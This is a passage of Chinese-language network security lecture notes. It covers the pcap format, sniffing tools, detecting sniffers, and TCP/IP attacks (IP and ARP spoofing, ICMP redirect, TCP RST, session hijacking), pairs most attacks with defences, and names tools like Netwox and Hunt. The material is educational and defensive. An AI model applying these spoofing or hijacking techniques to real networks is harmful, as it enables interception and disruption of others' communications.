<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pcap_file_header</span> &#123;</span></span><br><span class="line">        bpf_u_int32 magic;    <span class="comment">//4字节 pcap文件标识 目前为“d4 c3 b2 a1”</span></span><br><span class="line">        u_short version_major;   <span class="comment">//2字节 主版本号 </span></span><br><span class="line">        u_short version_minor;  <span class="comment">// 2字节 次版本号 </span></span><br><span class="line">        bpf_int32 thiszone;     <span class="comment">/* 4字节 时区修正     并未使用，目前全为0*/</span></span><br><span class="line">        bpf_u_int32 sigfigs;    <span class="comment">/* 4字节 精确时间戳   并未使用，目前全为0 */</span></span><br><span class="line">        bpf_u_int32 snaplen;    <span class="comment">/* 4字节 抓包最大长度, 抓全设为0x0000ffff, 缺省为68字节 */</span></span><br><span class="line">        bpf_u_int32 linktype;   <span class="comment">/* 4字节 链路类型    一般都是1：ethernet*/</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>各字段说明：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>字段</th>
<th>字节</th>
<th>16进制表示</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>Magic</td>
<td>4B</td>
<td>1A 2B 3C 4D</td>
<td>标示文件的开始</td>
</tr>
<tr>
<td>Major</td>
<td>2B</td>
<td>02 00</td>
<td>当前文件主要的版本号</td>
</tr>
<tr>
<td>Minor</td>
<td>2B</td>
<td>04 00</td>
<td>当前文件次要的版本号</td>
</tr>
<tr>
<td>ThisZone</td>
<td>4B</td>
<td></td>
<td>当地的标准时间</td>
</tr>
<tr>
<td>SigFlags</td>
<td>4B</td>
<td></td>
<td>时间戳的精度</td>
</tr>
<tr>
<td>SnapLen</td>
<td>4B</td>
<td></td>
<td>最大的存储长度</td>
</tr>
<tr>
<td>LinkType</td>
<td>4B</td>
<td></td>
<td>链路类型</td>
</tr>
</tbody>
</table>
</div>
<p>LinkType链路类型</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>值</th>
<th>类型</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>BSD loopback devices, except for later OpenBSD</td>
</tr>
<tr>
<td>1</td>
<td>Ethernet, and Linux loopback devices</td>
</tr>
<tr>
<td>6</td>
<td>802.5 Token Ring</td>
</tr>
<tr>
<td>7</td>
<td>ARCnet</td>
</tr>
<tr>
<td>8</td>
<td>SLIP</td>
</tr>
<tr>
<td>9</td>
<td>PPP</td>
</tr>
<tr>
<td>10</td>
<td>FDDI</td>
</tr>
<tr>
<td>100</td>
<td>LLC/SNAP-encapsulated ATM</td>
</tr>
<tr>
<td>101</td>
<td>“raw IP”, with no link</td>
</tr>
<tr>
<td>102</td>
<td>BSD/OS SLIP</td>
</tr>
<tr>
<td>103</td>
<td>BSD/OS PPP</td>
</tr>
<tr>
<td>104</td>
<td>Cisco HDLC</td>
</tr>
<tr>
<td>105</td>
<td>802.11</td>
</tr>
<tr>
<td>108</td>
<td>later OpenBSD loopback devices (with the AF_value in network byte order)</td>
</tr>
<tr>
<td>113</td>
<td>special Linux “cooked” capture</td>
</tr>
<tr>
<td>114</td>
<td>LocalTalk</td>
</tr>
</tbody>
</table>
</div>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pcap_pkthdr</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">ts</span>;</span>      <span class="comment">/* time stamp */</span></span><br><span class="line">        bpf_u_int32 caplen;     <span class="comment">/* length of portion present */</span></span><br><span class="line">        bpf_u_int32 len;        <span class="comment">/* length this packet (off wire) */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> &#123;</span></span><br><span class="line">        <span class="type">long</span>            tv_sec;         <span class="comment">/* seconds (XXX should be time_t) */</span></span><br><span class="line">        <span class="type">suseconds_t</span>     tv_usec;        <span class="comment">/* and microseconds */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>各字段说明：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>字段</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>Timestamp</td>
<td>时间戳高位，精确到seconds</td>
</tr>
<tr>
<td>Timestamp</td>
<td>时间戳低位，精确到microseconds</td>
</tr>
<tr>
<td>Caplen</td>
<td>当前数据区的长度，即抓取到的数据帧长度，由此可以得到下一个数据帧的位置。</td>
</tr>
<tr>
<td>Len</td>
<td>离线数据长度，网络中实际数据帧的长度，一般不大于caplen，多数情况下和Caplen数值相等。</td>
</tr>
</tbody>
</table>
</div>
<p>Packet 数据：即 Packet（通常就是链路层的数据帧去掉前面用于同步和标识帧开始的8字节和最后用于CRC校验的4字节）的具体内容，长度就是Caplen，这个长度的后面，就是当前PCAP文件中存放的下一个Packet数据包。PCAP文件里面并没有规定捕获的Packet数据包之间有什么间隔字符串，需要靠第一个Packet包确定下一组数据在文件中的起始位置。</p>
<h2 id="11-5-网络嗅探器软件"><a href="#11-5-网络嗅探器软件" class="headerlink" title="11.5 网络嗅探器软件"></a>11.5 网络嗅探器软件</h2><ul>
<li><p>类Unix平台网络嗅探器软件</p>
<p>–Libpcap抓包开发函数库</p>
<p>–Tcpdump以及wireshark嗅探器软件</p>
<p>–Snort、dsniff、sniffit和linux_sniffer…</p>
</li>
<li><p>Windows平台网络嗅探器软件</p>
<p>–NPF/winpcap/windump</p>
<p>–SnifferPro</p>
<p>–Buttsniffer、NetMon、Network Associates Sniffer</p>
</li>
</ul>
<h3 id="11-5-1-Windows平台下的抓包技术"><a href="#11-5-1-Windows平台下的抓包技术" class="headerlink" title="11.5.1 Windows平台下的抓包技术"></a>11.5.1 Windows平台下的抓包技术</h3><ul>
<li><p>内核本身没有提供标准的接口</p>
</li>
<li><p>通过增加一个驱动程序或者网络组件来访问内核网卡驱动提供的数据包</p>
<p>–在Windows不同操作系统平台下有所不同</p>
</li>
<li><p>不同sniffer采用的技术不同</p>
<p>–WinPcap是一个重要的抓包工具，它是libpcap的Windows版本</p>
</li>
</ul>
<h4 id="11-5-1-1-WinPcap"><a href="#11-5-1-1-WinPcap" class="headerlink" title="11.5.1.1 WinPcap"></a>11.5.1.1 WinPcap</h4><ul>
<li><p>WinPcap包括三个部分</p>
<p>–第一个模块NPF(Netgroup Packet Filter)，是一个虚拟设备驱动程序文件。它的功能是过滤数据包，并把这些数据包原封不动地传给用户态模块，这个过程中包括了一些操作系统特有的代码</p>
<p>–第二个模块packet.dll为win32平台提供了一个公共的接口。不同版本的Windows系统都有自己的内核模块和用户层模块。Packet.dll用于解决这些不同。调用Packet.dll的程序可以运行在不同版本的Windows平台上，而无需重新编译</p>
<p>–第三个模块Wpcap.dll是不依赖于操作系统的。它提供了更加高层、抽象的函数。</p>
</li>
<li><p>packet.dll和Wpcap.dll</p>
<p>–packet.dll直接映射了内核的调用</p>
<p>–Wpcap.dll提供了更加友好、功能更加强大的函数调用</p>
</li>
</ul>


<ul>
<li><p>NPF在Windows网络结构中位置</p>
<ul>
<li>NDIS(Network Driver Interface Specification，网络驱动接口规范)描述了网络驱动与底层网卡之间的接口规范，以及它与上层协议之间的规范</li>
<li>NPF作为一个核心驱动程序而提供的</li>
</ul>
</li>
<li><p>WinPcap优势</p>
<ul>
<li><p>提供了一套标准的抓包接口</p>
<p>​    –与libpcap兼容，可使得原来许多类UNIX平台下的网络分析工具快速移植过来</p>
<p>​    –便于开发各种网络分析工具</p>
</li>
<li><p>除了与libpcap兼容的功能之外，还有</p>
<p>​    –充分考虑了各种性能和效率的优化，包括对于NPF内核层次上的过滤器支持</p>
<p>​    –支持内核态的统计模式</p>
<p>​    –提供了发送数据包的能力</p>
</li>
</ul>
</li>
</ul>
<h2 id="11-6-网络嗅探的检测技术"><a href="#11-6-网络嗅探的检测技术" class="headerlink" title="11.6 网络嗅探的检测技术"></a>11.6 网络嗅探的检测技术</h2><ul>
<li><p>网卡和操作系统对于是否处于混杂模式会有一些不同的行为，利用这些特征可以判断一个机器是否运行在混杂模式下</p>
</li>
<li><p>一些检测手段</p>
<p>–根据操作系统的特征</p>
<ul>
<li>Linux内核的特性：正常情况下，只处理本机MAC地址或者以太广播地址的包。在混杂模式下，许多版本的Linux内核只检查数据包中的IP地址以确定是否送到IP堆栈。因此，可以构造无效以太地址而IP地址有效的ICMP ECHO请求，看机器是否返回应答包(混杂模式)，或忽略(非混杂模式)。</li>
<li>Windows 9x/NT：在混杂模式下，检查一个包是否为以太广播包时，只看MAC地址前八位是否为0xff。</li>
</ul>
<p>–根据网络和主机的性能</p>
<ul>
<li>根据响应时间：向本地网络发送大量的伪造数据包，然后，看目标主机的响应时间，首先要测得一个响应时间基准和平均值。</li>
</ul>
</li>
</ul>
<h2 id="11-7-网络嗅探技术的防范措施"><a href="#11-7-网络嗅探技术的防范措施" class="headerlink" title="11.7 网络嗅探技术的防范措施"></a>11.7 网络嗅探技术的防范措施</h2><ul>
<li><p>采用安全的网络拓扑</p>
<p>–共享式网络à交换式网络</p>
<p>–交换机上设置VLAN等技术手段，对网络进行合理的分段</p>
</li>
<li><p>共享式以太网à交换式以太网拓扑</p>
<p>–性能提升: 广播冲突域à  每台主机单独冲突域</p>
<p>–安全性提升: 较难被网络监听</p>
<p>–交换式网络提供安全性仍可能被挫败: ARP欺骗</p>
</li>
<li><p>静态ARP或者MAC-端口映射表代替动态机制</p>
</li>
<li><p>重视网络数据传输的集中位置点的安全防范</p>
</li>
<li><p>避免使用明文传输口令/敏感信息网络协议, 使用加密协议</p>
<p>–telnet-&gt;ssh</p>
<p>–IPSEC/TLS</p>
</li>
</ul>
<h2 id="11-8-网络协议分析"><a href="#11-8-网络协议分析" class="headerlink" title="11.8 网络协议分析"></a>11.8 网络协议分析</h2><ul>
<li><p>网络协议分析的粒度和层次</p>
<p>–原始数据包: 最细粒度、最低层次</p>
<p>–网络流(/会话): 通过5元组进行流(/会话)重组</p>
</li>
<li><p>5元组: sip, sport, dip, dport, ipproto</p>
<p>–网络流高层统计</p>
<p>–IP会话列表<sip, sport></p>
<ul>
<li>目标端口流统计\<dport></li>
</ul>
</li>
<li><p>网络报文分析工具</p>
<p>–集成工具: Wireshark</p>
<p>–网络流重组: nstreams, snort</p>
<p>–高层统计和摘要分析: Netflow, RRDTools</p>
</li>
<li><p>原始数据包粒度网络协议分析对网络上传输的二进制格式数据包进行解析，以恢复出各层网络协议信息以及传输内容的技术方法。</p>
</li>
</ul>

<h2 id="11-9-网络协议分析技术实现"><a href="#11-9-网络协议分析技术实现" class="headerlink" title="11.9 网络协议分析技术实现"></a>11.9 网络协议分析技术实现</h2><ul>
<li><p>实现参考源码</p>
<p>–Snort中的网络解码器模块</p>
<p>–decode.c/decode.h</p>
</li>
<li><p>解析以太网数据帧 DecodeEthPkt</p>
<p>–预处理：拆包前进行一些前期处理</p>
<p>–拆包：将当前得到的包内存位置赋给Packet数据结构中相应的指针eh(EtherHdr)型的指针即可</p>
<p>–解析上层协议： switch语句，根据ether_type分别调用相应的上层协议解析例程</p>
</li>
</ul>

<h2 id="11-10-Wireshark-ethereal"><a href="#11-10-Wireshark-ethereal" class="headerlink" title="11.10 Wireshark(ethereal)"></a>11.10 Wireshark(ethereal)</h2><ul>
<li><p>Wireshark特性</p>
<p>–图形化界面/命令行(tshark)</p>
<p>–在线/离线抓包(支持标准pcap二进制日志文件)</p>
<p>–支持BPF过滤器</p>
<p>–支持分析几百种常见网络协议</p>
<p>–跨平台：类UNIX、Win32(依赖libpcap/WinPcap)</p>
</li>
</ul>
<h3 id="11-10-1-Wireshark基本功能"><a href="#11-10-1-Wireshark基本功能" class="headerlink" title="11.10.1 Wireshark基本功能"></a>11.10.1 Wireshark基本功能</h3><ul>
<li><p>抓包(Capture)</p>
<p>–Capture Filter: BPF过滤器</p>
</li>
<li><p>分析(Analyze)</p>
<p>–自动协议解码: 支持数百种协议, 显示各层包头和内容字段</p>
<p>–灵活选择协议对网络流进行解码Decode As…</p>
</li>
<li><p>统计(Statistics)</p>
<p>–协议分类(Protocol Hierarchy)</p>
<p>–会话列表(Conversations)</p>
<ul>
<li>2层(以太网)/3层(IP)/4层(TCP,UDP)</li>
</ul>
<p>–会话终端(EndPoints)</p>
<p>–I/O Graph: 随时间统计的流量曲线</p>
<p>–会话重组(Follow TCP/UDP Stream)(Flow Graph)</p>
</li>
</ul>
<h3 id="11-10-2-Wireshark中的两类过滤规则"><a href="#11-10-2-Wireshark中的两类过滤规则" class="headerlink" title="11.10.2 Wireshark中的两类过滤规则"></a>11.10.2 Wireshark中的两类过滤规则</h3><ul>
<li><p>嗅探过滤规则</p>
<p>–支持BPF规则</p>
<p>–用于嗅探抓包时的过滤</p>
</li>
<li><p>显示过滤规则</p>
<p>–用于在界面中选择显示哪些数据包</p>
<p>–与BPF规则有所不同</p>
</li>
</ul>
<h2 id="11-11-流重组-会话重组"><a href="#11-11-流重组-会话重组" class="headerlink" title="11.11 流重组/会话重组"></a>11.11 流重组/会话重组</h2><ul>
<li><p>流重组/会话重组</p>
<p>–TCP/UDP会话发送字节数可能很大</p>
<p>–IP包最大长度(64K-20≈64K)</p>
<p>–以太网帧最大长度(1500-20=1480)</p>
<p>–协议栈发送大量TCP/UDP报文时，必然分组传送</p>
<p>–流重组: 将同属于一个TCP/UDP会话的IP包负载按序重新组装，还原应用层数据的过程</p>
</li>
<li><p>流重组工具</p>
<p>–Wireshark: Follow TCP/UDP Stream</p>
<p>–nstreams:</p>
<ul>
<li>nstreams -f pcap_file &gt; nstreams.txt</li>
</ul>
<p>–Snort:</p>
<ul>
<li><p>Log规则(snort.conf): log tcp any any &lt;&gt; any any (sid:1000001; session: printable;)</p>
</li>
<li><p>snort -r pcap_file –l ./log -csnort.conf</p>
</li>
</ul>
</li>
</ul>
<h2 id="11-12-网络流记录和高层统计分析"><a href="#11-12-网络流记录和高层统计分析" class="headerlink" title="11.12 网络流记录和高层统计分析"></a>11.12 网络流记录和高层统计分析</h2><ul>
<li><p>Netflow</p>
<p>–定义了网络会话流记录的业界标准-Cisco</p>
</li>
<li><p>RFC 3334/3954/3955</p>
<p>–IP Flow Information Export (netflowv10)-IETF</p>
</li>
<li><p>网络流记录</p>
<p>–商业路由器、交换机支持Netflow日志输出</p>
<p>–开源软件: nfdump(支持Netflow标准), Argus</p>
</li>
<li><p>网络流分析</p>
<p>–基于pcap文件上的流重组和统计分析</p>
</li>
<li><p>Wireshark: 协议分类/会话列表…</p>
</li>
<li><p>SnifferPro</p>
<p>–NetflowAnalyzer: HP openview/cacti/nfsen</p>
</li>
</ul>
<h2 id="11-13-嗅探实例——网站指纹"><a href="#11-13-嗅探实例——网站指纹" class="headerlink" title="11.13 嗅探实例——网站指纹"></a>11.13 嗅探实例——网站指纹</h2>


<h1 id="12-TCP-IP网络协议攻击"><a href="#12-TCP-IP网络协议攻击" class="headerlink" title="12. TCP/IP网络协议攻击"></a>12. TCP/IP网络协议攻击</h1><h2 id="12-1-网络安全属性"><a href="#12-1-网络安全属性" class="headerlink" title="12.1 网络安全属性"></a>12.1 网络安全属性</h2><ul>
<li><p>网络安全CIA属性</p>
<p>–保密性(Confidentiality)</p>
<p>–完整性(Integrity)</p>
<p>–可用性(Availability)</p>
</li>
<li><p>其他三个补充属性</p>
<p>–真实性(Authentication)</p>
<p>–不可抵赖性(Non-Repudiation) </p>
<p>–可审查性(Accountability)</p>
</li>
</ul>
<h2 id="12-2-网络攻击基本模式"><a href="#12-2-网络攻击基本模式" class="headerlink" title="12.2 网络攻击基本模式"></a>12.2 网络攻击基本模式</h2><p>在 x. 800和 RFC 2828中使用的一种有用的安全攻击分类方法是被动攻击和主动攻击。</p>
<h3 id="12-2-1-被动攻击"><a href="#12-2-1-被动攻击" class="headerlink" title="12.2.1 被动攻击"></a>12.2.1 被动攻击</h3><p>被动攻击试图从系统中学习或使用信息，但不影响系统资源。</p>
<p>被动攻击的本质是窃听或监听传输。对手的目标是获取正在传输的信息。被动攻击有两种类型:</p>
<ul>
<li>发布消息内容</li>
</ul>

<ul>
<li>流量分析——监控流量，以确定通信主机的位置和身份，并可以观察交换消息的频率和长度</li>
</ul>

<p>这些攻击很难发现，因为它们不涉及对数据的任何更改。</p>
<h3 id="12-2-2-主动攻击"><a href="#12-2-2-主动攻击" class="headerlink" title="12.2.2 主动攻击"></a>12.2.2 主动攻击</h3><p>主动攻击包括修改数据流或创建虚假数据流，可以细分为4个类别: 伪装、重放、篡改消息和分布式拒绝服务攻击：</p>
<ul>
<li>把一个实体伪装成另一个实体</li>
</ul>

<ul>
<li>重播以前的讯息</li>
</ul>

<ul>
<li>修改/改变传输中的信息以产生未经授权的效果</li>
</ul>

<ul>
<li>分布式拒绝服务攻击——防止或抑制通讯设施的正常使用或管理</li>
</ul>

<p>主动攻击呈现出与被动攻击相反的特征。虽然被动攻击很难被发现，但可以采取措施防止其成功。另一方面，由于潜在的物理、软件和网络漏洞种类繁多，要完全防止主动攻击是相当困难的。相反，我们的目标是检测主动攻击，并从它们造成的任何干扰或延迟中恢复。</p>
<h3 id="12-2-3-对攻击的一般处理原则"><a href="#12-2-3-对攻击的一般处理原则" class="headerlink" title="12.2.3 对攻击的一般处理原则"></a>12.2.3 对攻击的一般处理原则</h3><ul>
<li><p>被动攻击 – 侧重于阻止</p>
<p>—容易阻止</p>
<p>—难于检测</p>
</li>
<li><p>主动攻击 – 侧重于检测与恢复</p>
<p>—难于阻止</p>
<p>—容易检测</p>
</li>
</ul>
<p>考虑安全服务的作用，可能需要什么。注意到两个的异同与传统的纸质文件，例如：</p>
<ul>
<li>有签名、日期；</li>
<li>需要从披露的保护、篡改或销毁；</li>
<li>可经公证和见证；</li>
<li>可以记录或许可。 </li>
</ul>
<h3 id="12-2-4-中间人攻击-MITM攻击"><a href="#12-2-4-中间人攻击-MITM攻击" class="headerlink" title="12.2.4 中间人攻击(MITM攻击)"></a>12.2.4 中间人攻击(MITM攻击)</h3><ul>
<li><p>通信双方</p>
<p>–Alice &amp; Bob</p>
</li>
<li><p>中间人</p>
<p>–Mallory</p>
<p>–与通信双方建立起各自独立的会话连接</p>
<p>–对双方进行身份欺骗</p>
<p>–进行消息的双向转发</p>
<p>–必要前提：拦截通信双方的全部通信(截获)、转发篡改消息(篡改)、双方身份欺骗(伪造)</p>
<p>–现实世界中的中间人攻击–国际象棋欺骗术</p>
</li>
</ul>

<h2 id="12-3-安全缺陷与攻击技术"><a href="#12-3-安全缺陷与攻击技术" class="headerlink" title="12.3 安全缺陷与攻击技术"></a>12.3 安全缺陷与攻击技术</h2>
<h2 id="12-4-原始报文伪造技术及工具"><a href="#12-4-原始报文伪造技术及工具" class="headerlink" title="12.4 原始报文伪造技术及工具"></a>12.4 原始报文伪造技术及工具</h2><ul>
<li><p>原始报文伪造技术</p>
<p>–伪造出特制的网络数据报文并发送</p>
<p>–原始套接字(Raw Socket)</p>
</li>
<li><p>Netwox/Netwag</p>
<p>–超过200个不同功能的网络报文生成与发送工具</p>
<p>–#netwoxnumber [parameters … ]</p>
</li>
</ul>
<h3 id="12-4-1-Netwox工具使用"><a href="#12-4-1-Netwox工具使用" class="headerlink" title="12.4.1 Netwox工具使用"></a>12.4.1 Netwox工具使用</h3><ul>
<li><p>Netwox: 命令行</p>
</li>
<li><p>Netwag: 窗口, TCL支持</p>
</li>
<li><p>Wireshark捕获网络包</p>
</li>
<li><p>工具32：伪造以太网包</p>
</li>
</ul>
<h2 id="12-5-网络层协议攻击"><a href="#12-5-网络层协议攻击" class="headerlink" title="12.5 网络层协议攻击"></a>12.5 网络层协议攻击</h2><h3 id="12-5-1-IP源地址欺骗"><a href="#12-5-1-IP源地址欺骗" class="headerlink" title="12.5.1 IP源地址欺骗"></a>12.5.1 IP源地址欺骗</h3><ul>
<li><p>IP源地址欺骗</p>
<p>–伪造具有虚假源地址的IP数据包进行发送</p>
<p>–目的：隐藏攻击者身份、假冒其他计算机</p>
</li>
<li><p>IP源地址欺骗原理</p>
<p>–路由转发只是用目标IP地址，不对源做验证</p>
<p>–现实世界中的平信</p>
<p>–通常情况：无法获得响应包</p>
</li>
</ul>

<ul>
<li><p>假冒IP攻击</p>
<ul>
<li><p>可以嗅探响应包的环境</p>
<p>​    –同一局域网</p>
<p>​    –ARP欺骗、重定向攻击劫持响应包</p>
</li>
<li><p>盲攻击(blind attack)</p>
<p>​    –Robert T. Morris在1985年提出</p>
<p>​    –Kevin Mitinick在1995年仍使用</p>
<p>​    –通过猜测TCP三次握手中所需的信息，假冒IP建立起TCP连接</p>
</li>
</ul>
</li>
</ul>
<h4 id="12-5-1-1-TCP连接的基本信息"><a href="#12-5-1-1-TCP连接的基本信息" class="headerlink" title="12.5.1.1 TCP连接的基本信息"></a>12.5.1.1 TCP连接的基本信息</h4><p>五元组(srcip(源IP), srcport, dstip, dstport, proto)</p>
<p>反映传输状态(seq, ack)</p>
<h4 id="12-5-1-2-盲攻击过程"><a href="#12-5-1-2-盲攻击过程" class="headerlink" title="12.5.1.2 盲攻击过程"></a>12.5.1.2 盲攻击过程</h4>
<h4 id="12-5-1-3-IP源地址欺骗技术的应用场景"><a href="#12-5-1-3-IP源地址欺骗技术的应用场景" class="headerlink" title="12.5.1.3 IP源地址欺骗技术的应用场景"></a>12.5.1.3 IP源地址欺骗技术的应用场景</h4><ul>
<li><p>普遍应用场景</p>
<p>–拒绝服务攻击：无需或不期望响应包，节省带宽，隐藏攻击源</p>
<p>–网络扫描(nmap -D)：将真正扫描源隐藏于一些欺骗的源IP地址中</p>
</li>
<li><p>假冒IP攻击场景</p>
<p>–对付基于IP地址的身份认证机制</p>
<ul>
<li><p>类Unix平台上的主机信任关系</p>
</li>
<li><p>防火墙或服务器中配置的特定IP访问许可</p>
</li>
</ul>
<p>–远程主机IP欺骗-盲攻击，较难成功</p>
</li>
</ul>
<h4 id="12-5-1-4-利用Netwox进行IP源地址欺骗"><a href="#12-5-1-4-利用Netwox进行IP源地址欺骗" class="headerlink" title="12.5.1.4 利用Netwox进行IP源地址欺骗"></a>12.5.1.4 利用Netwox进行IP源地址欺骗</h4><p>工具34/38</p>
<h4 id="12-5-1-5-IP源地址欺骗的防范措施"><a href="#12-5-1-5-IP源地址欺骗的防范措施" class="headerlink" title="12.5.1.5 IP源地址欺骗的防范措施"></a>12.5.1.5 IP源地址欺骗的防范措施</h4><ul>
<li><p>使用随机化的初始序列号以避免远程的盲攻击</p>
</li>
<li><p>使用网络层安全传输协议如IPsec</p>
<p>–避免泄露高层协议可供利用的信息及传输内容</p>
</li>
<li><p>避免采用基于IP地址的信任策略</p>
<p>–以基于加密算法的用户身份认证机制来替代</p>
</li>
<li><p>在路由器和网关上实施包检查和过滤</p>
<p>–入站过滤机制(ingress filtering)</p>
<p>–出站过滤机制(egress filtering)</p>
</li>
</ul>
<h3 id="12-5-2-ARP欺骗"><a href="#12-5-2-ARP欺骗" class="headerlink" title="12.5.2 ARP欺骗"></a>12.5.2 ARP欺骗</h3><ul>
<li><p>ARP协议工作原理</p>
<p>–将网络主机的IP地址解析成其MAC地址</p>
<p>–①每台主机设备上都拥有一个ARP缓存(ARP Cache)</p>
<p>–②检查自己的ARP缓存，有，直接映射，无，广播ARP请求包</p>
<p>–③检查数据包中的目标IP地址是否与自己的IP地址一致，如一致，发送ARP响应，告知MAC地址</p>
<p>–④源节点在收到这个ARP响应数据包后，将得到的目标主机IP地址和MAC地址对映射表项添加到自己的ARP缓存中</p>
</li>
</ul>

<h4 id="12-5-2-1-ARP欺骗攻击技术原理"><a href="#12-5-2-1-ARP欺骗攻击技术原理" class="headerlink" title="12.5.2.1 ARP欺骗攻击技术原理"></a>12.5.2.1 ARP欺骗攻击技术原理</h4><p>ARP欺骗：发送伪造ARP消息，对特定IP所对应的MAC地址进行假冒欺骗，从而达到恶意目的。</p>

<ul>
<li>网关ARP欺骗</li>
</ul>

<h4 id="12-5-2-2-ARP欺骗技术的应用场景"><a href="#12-5-2-2-ARP欺骗技术的应用场景" class="headerlink" title="12.5.2.2 ARP欺骗技术的应用场景"></a>12.5.2.2 ARP欺骗技术的应用场景</h4><ul>
<li><p>利用ARP欺骗进行交换网络中的嗅探</p>
</li>
<li><p>ARP欺骗构造中间人攻击，从而实施TCP会话劫持</p>
</li>
<li><p>ARP病毒</p>
</li>
<li><p>ARP欺骗挂马</p>
</li>
</ul>
<h4 id="12-5-2-3-利用Netwox进行ARP欺骗"><a href="#12-5-2-3-利用Netwox进行ARP欺骗" class="headerlink" title="12.5.2.3 利用Netwox进行ARP欺骗"></a>12.5.2.3 利用Netwox进行ARP欺骗</h4><p>工具33</p>
<h4 id="12-5-2-4-ARP欺骗攻击防范措施"><a href="#12-5-2-4-ARP欺骗攻击防范措施" class="headerlink" title="12.5.2.4 ARP欺骗攻击防范措施"></a>12.5.2.4 ARP欺骗攻击防范措施</h4><ul>
<li><p>静态绑定关键主机的IP地址与MAC地址映射关系</p>
<p>–网关/关键服务器</p>
<p>–“arp -s IP地址 MAC地址类型”</p>
</li>
<li><p>使用相应的ARP防范工具</p>
<p>–ARP防火墙</p>
</li>
<li><p>使用VLAN虚拟子网细分网络拓扑</p>
</li>
<li><p>加密传输数据以降低ARP欺骗攻击的危害后果</p>
</li>
</ul>
<h3 id="12-5-3-ICMP路由重定向攻击"><a href="#12-5-3-ICMP路由重定向攻击" class="headerlink" title="12.5.3 ICMP路由重定向攻击"></a>12.5.3 ICMP路由重定向攻击</h3><ul>
<li><p>ICMP路由重定向攻击</p>
<p>–伪装成路由器发送虚假的ICMP路由路径控制报文</p>
<p>–使受害主机选择攻击者指定的路由路径</p>
<p>–攻击目的：嗅探或假冒攻击</p>
</li>
<li><p>技术原理</p>
<p>–路由器告知主机：“应该使用的路由器IP地址”</p>
</li>
</ul>

<h4 id="12-5-3-1-ICMP路由重定向攻击技术"><a href="#12-5-3-1-ICMP路由重定向攻击技术" class="headerlink" title="12.5.3.1 ICMP路由重定向攻击技术"></a>12.5.3.1 ICMP路由重定向攻击技术</h4><ul>
<li><p>攻击节点冒充网关IP，向被攻击节点发送ICMP重定向报文，并将指定的新路由器IP地址设置为攻击节点</p>
</li>
<li><p>被攻击节点接受报文，选择攻击节点作为其新路由器(即网关)</p>
</li>
<li><p>攻击节点可以开启路由转发，实施中间人攻击</p>
</li>
<li><p>“谎言还是真话”？</p>
</li>
</ul>
<h4 id="12-5-3-2-ICMP路由重定向攻击防范"><a href="#12-5-3-2-ICMP路由重定向攻击防范" class="headerlink" title="12.5.3.2 ICMP路由重定向攻击防范"></a>12.5.3.2 ICMP路由重定向攻击防范</h4><ul>
<li>根据类型过滤一些ICMP数据包</li>
<li>设置防火墙过滤</li>
<li>对于ICMP重定向报文判断是不是来自本地路由器</li>
</ul>
<h2 id="12-6-传输层协议攻击"><a href="#12-6-传输层协议攻击" class="headerlink" title="12.6 传输层协议攻击"></a>12.6 传输层协议攻击</h2><h3 id="12-6-1-TCP-RST攻击"><a href="#12-6-1-TCP-RST攻击" class="headerlink" title="12.6.1 TCP RST攻击"></a>12.6.1 TCP RST攻击</h3><ul>
<li><p>中断攻击</p>
<p>–伪造TCP重置报文攻击(spoofed TCP reset packet)</p>
<p>–TCP重置报文将直接关闭掉一个TCP会话连接</p>
<p>–限制条件：通讯目标方接受TCP包</p>
</li>
<li><p>通讯源IP地址及端口号一致</p>
</li>
<li><p>序列号(Seq)落入TCP窗口之内</p>
<p>–嗅探监视通信双方的TCP连接，获得源、目标IP地址及端口</p>
<p>–结合IP源地址欺骗技术伪装成通信一方，发送TCP重置报文给通信另一方</p>
</li>
<li><p>应用场景：恶意拒绝服务攻击、重置入侵连接、GFW</p>
<p>–GFW: “net::ERR_CONNECTION_RESET”</p>
</li>
</ul>
<p>例：针对Google检索的 TCP RESET</p>
<p>p4-36-41</p>
<h3 id="12-6-2-TCP会话劫持"><a href="#12-6-2-TCP会话劫持" class="headerlink" title="12.6.2 TCP会话劫持"></a>12.6.2 TCP会话劫持</h3><ul>
<li><p>结合嗅探、欺骗技术</p>
</li>
<li><p>中间人攻击：注射额外信息，暗中改变通信</p>
</li>
<li><p>计算出正确的 seq，ackseq 即可</p>
</li>
<li><p>TCP会话攻击工具</p>
<p>–Juggernaut、Hunt、TTY watcher、IP watcher</p>
</li>
</ul>

<h4 id="12-6-2-1-Hunt工具介绍"><a href="#12-6-2-1-Hunt工具介绍" class="headerlink" title="12.6.2.1 Hunt工具介绍"></a>12.6.2.1 Hunt工具介绍</h4><ul>
<li><p>源码开放的自由软件，可运行在Linux平台上</p>
</li>
<li><p>功能特点</p>
<p>–监听当前网络上的会话</p>
<p>–重置会话(reset a session)</p>
<p>–劫持会话</p>
<ul>
<li>在劫持之后，使连接继续同步</li>
</ul>
<p>–确定哪些主机在线</p>
<p>–四个守护进程</p>
<ul>
<li>自动reset</li>
<li>Arp欺骗包的转发</li>
<li>收集MAC地址</li>
<li>具有搜索功能的sniffer</li>
</ul>
</li>
</ul>
<h4 id="12-6-2-2-会话劫持的防范措施"><a href="#12-6-2-2-会话劫持的防范措施" class="headerlink" title="12.6.2.2 会话劫持的防范措施"></a>12.6.2.2 会话劫持的防范措施</h4><ul>
